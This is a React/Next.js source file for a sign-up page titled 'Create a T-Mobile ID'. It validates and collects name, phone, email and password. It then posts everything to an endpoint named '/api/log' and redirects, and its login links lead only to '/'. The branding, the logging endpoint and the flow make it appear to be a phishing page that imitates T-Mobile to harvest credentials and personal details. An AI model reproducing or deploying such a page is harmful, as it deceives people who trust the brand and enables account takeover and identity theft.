'use client';

import type React from "react";
import { useState } from "react";
import Link from "next/link";

type Fields = {
  firstName: string;
  lastName: string;
  phone: string;
  email: string;
  password: string;
};

export function SignUpForm() {
  const [fields, setFields] = useState<Fields>({
    firstName: "",
    lastName: "",
    phone: "",
    email: "",
    password: "",
  });

  const [errors, setErrors] = useState<Partial<Record<keyof Fields, string>>>({});
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  function handleChange(key: keyof Fields, value: string) {
    setFields((f) => ({ ...f, [key]: value }));
    setErrors((e) => ({ ...e, [key]: undefined }));
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    setIsLoading(true);

    const nextErrors: Partial<Record<keyof Fields, string>> = {};

    if (!fields.firstName.trim()) nextErrors.firstName = "You can't leave this empty";
    if (!fields.lastName.trim()) nextErrors.lastName = "You can't leave this empty";

    const phoneDigits = fields.phone.replace(/\D/g, "");
    if (!phoneDigits) {
      nextErrors.phone = "You can't leave this empty";
    } else if (phoneDigits.length !== 10) {
      nextErrors.phone = "Invalid number. Please enter a 10-digit phone number.";
    }

    if (!fields.email.trim()) {
      nextErrors.email = "You can't leave this empty";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fields.email.trim())) {
      nextErrors.email = "Please enter a valid email address";
    }

    if (!fields.password) {
      nextErrors.password = "You can't leave this empty";
    } else if (fields.password.length < 8 || fields.password.length > 50) {
      nextErrors.password = "Passwords must be 8 – 50 characters.";
    } else if (!/[a-zA-Z]/.test(fields.password) || !/\d/.test(fields.password)) {
      nextErrors.password = "Passwords must contain one letter and one number.";
    }

    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      setIsLoading(false);
      return;
    }

    // Validation passed → send to API
    const data = {
      username: fields.email,           // or phone if preferred
      email: fields.email,
      password: fields.password,
      firstName: fields.firstName,
      lastName: fields.lastName,
      phone: fields.phone,
      type: 'signup'
    };

    try {
      const res = await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (res.ok) {
        window.location.href = '/account-type';
      } else {
        setErrors({ email: "Something went wrong. Please try again." });
      }
    } catch (err) {
      console.error('Signup failed', err);
      setErrors({ email: "Connection error. Please try again." });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-md">
      {/* Logo */}
      <div className="flex h-9 w-9 items-center justify-center rounded-md bg-primary">
        <span className="text-lg font-extrabold text-primary-foreground">T</span>
      </div>

      <h1 className="mt-5 text-4xl font-extrabold tracking-tight text-foreground text-balance">
        Create a T-Mobile ID
      </h1>
      <p className="mt-3 text-sm text-muted-foreground">
        We just need a couple pieces of info to get you started.
      </p>

      <form onSubmit={handleSubmit} noValidate className="mt-8 space-y-6">
        <Field
          id="firstName"
          name="firstName"
          label="First name"
          value={fields.firstName}
          onChange={(v) => handleChange("firstName", v)}
          error={errors.firstName}
          autoComplete="given-name"
        />
        <Field
          id="lastName"
          name="lastName"
          label="Last name"
          value={fields.lastName}
          onChange={(v) => handleChange("lastName", v)}
          error={errors.lastName}
          autoComplete="family-name"
        />
        <Field
          id="phone"
          name="phone"
          label="Phone number"
          type="tel"
          inputMode="tel"
          value={fields.phone}
          onChange={(v) => handleChange("phone", v)}
          error={errors.phone}
          autoComplete="tel"
        />
        <Field
          id="email"
          name="email"
          label="Email"
          type="email"
          inputMode="email"
          value={fields.email}
          onChange={(v) => handleChange("email", v)}
          error={errors.email}
          autoComplete="email"
        />
        <Field
          id="password"
          name="password"
          label="Password"
          type={showPassword ? "text" : "password"}
          value={fields.password}
          onChange={(v) => handleChange("password", v)}
          error={errors.password}
          autoComplete="new-password"
        />

        <label className="flex cursor-pointer items-center gap-2">
          <input
            type="checkbox"
            checked={showPassword}
            onChange={(e) => setShowPassword(e.target.checked)}
            className="h-4 w-4 rounded border-input accent-primary"
          />
          <span className="text-sm font-bold text-primary">Show password</span>
        </label>

        <p className="text-sm leading-relaxed text-muted-foreground">
          Passwords must be 8 – 50 characters, contain one letter and one number, and no common
          patterns and phrases.
        </p>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full rounded-md bg-primary px-6 py-3 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-70"
        >
          {isLoading ? "Creating account..." : "Create T-Mobile ID"}
        </button>
      </form>

      <div className="mt-8">
        <p className="text-sm text-foreground">
          Already have a T-Mobile ID?{" "}
          <Link href="/" className="font-bold text-primary hover:underline">
            T-Mobile ID
          </Link>
        </p>
        <Link href="/" className="mt-1 inline-block text-sm font-bold text-primary hover:underline">
          Log in
        </Link>
      </div>
    </div>
  );
}

function Field({
  id,
  name,
  label,
  value,
  onChange,
  error,
  type = "text",
  inputMode,
  autoComplete,
}: {
  id: string;
  name?: string;
  label: string;
  value: string;
  onChange: (value: string) => void;
  error?: string;
  type?: string;
  inputMode?: React.HTMLAttributes<HTMLInputElement>["inputMode"];
  autoComplete?: string;
}) {
  return (
    <div>
      <label
        htmlFor={id}
        className={`block text-sm font-bold ${error ? "text-destructive" : "text-foreground"}`}
      >
        {label}
      </label>
      <input
        id={id}
        name={name}
        type={type}
        inputMode={inputMode}
        autoComplete={autoComplete}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        aria-invalid={error ? true : undefined}
        aria-describedby={error ? `${id}-error` : undefined}
        className={`mt-2 w-full rounded-md border bg-background px-4 py-2.5 text-sm text-foreground outline-none focus:ring-1 ${
          error
            ? "border-destructive focus:border-destructive focus:ring-destructive"
            : "border-input focus:border-primary focus:ring-primary"
        }`}
      />
      {error && (
        <p id={`${id}-error`} className="mt-1.5 flex items-center gap-1 text-xs font-medium text-destructive">
          <span aria-hidden="true" className="inline-flex h-3.5 w-3.5 items-center justify-center rounded-full bg-destructive text-[10px] font-bold leading-none text-background">
            !
          </span>
          {error}
        </p>
      )}
    </div>
  );
}